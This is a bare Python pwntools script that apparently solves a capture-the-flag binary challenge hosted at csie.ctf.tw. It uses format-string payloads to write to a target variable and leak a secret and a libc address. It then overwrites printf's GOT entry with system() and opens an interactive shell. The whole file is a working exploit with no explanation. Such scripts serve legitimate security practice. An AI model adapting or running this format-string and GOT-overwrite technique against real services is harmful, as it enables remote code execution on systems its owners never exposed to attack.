from pwn import *

r = remote('csie.ctf.tw', 10129)

a = 0x6012ac
libc_start = 0x6011e0
printf_got = 0x601230
system_offset = 0x4f440
diff = 0xface - 0xb00c

# set a
payload = '%' + str(0xb00c) + 'c%24$hn'
payload += '%' + str(diff) + 'c%25$hn'
payload += 'ABC%8$p.%9$pABC%26$s'

payload = payload.ljust(0x40,'\x00') + p64(a) + p64(a+2) + p64(libc_start)

r.sendafter('name ?', payload)

r.recvuntil('ABC0x')

secret = p64(int(r.recvuntil('.0x')[:-3], 16)) + p64(int(r.recvuntil('ABC')[:-3], 16))
libc = u64(r.recv(6).ljust(8, '\x00')) - 0x21ab0

print r.recvuntil('}')
r.sendafter('?', secret)
print r.recvuntil('}')

print hex(libc)
system = libc + system_offset

payload = '%' + str(system & 0xff) + 'c%13$hhn%' + str(((system & 0xffff00 ) >> 8) - (system & 0xff)) + 'c%14$hn'
payload = payload.ljust(0x18, '\x00') + p64(printf_got) + p64(printf_got+1)
r.sendafter(':', payload)
r.interactive()
